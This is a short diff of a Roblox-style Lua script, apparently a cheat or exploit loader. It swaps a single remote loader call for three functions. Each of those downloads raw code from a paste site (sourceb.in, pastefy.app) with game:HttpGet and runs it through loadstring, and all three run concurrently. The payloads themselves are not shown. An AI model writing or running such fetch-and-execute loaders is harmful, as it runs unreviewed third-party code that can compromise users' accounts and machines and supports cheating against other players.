@@ -1,1 +1,13 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU3NTA2NmI2LWUyNDctNDZhZS05NjBhLWIyZjVhMjY0MDhjZCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmUifX0"))()
+local function s1() 
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WU7U1cr0kI/0", true))()
+end 
+local function s2() 
+    loadstring(game:HttpGet("https://pastefy.app/iZmH8NW9/raw", true))()
+end 
+local function s3()
+
+loadstring(game:HttpGet("https://pastefy.app/ljMmQAYG/raw", true))()
+end
+task.spawn(s1)
+task.spawn(s2)
+task.spawn(s3)
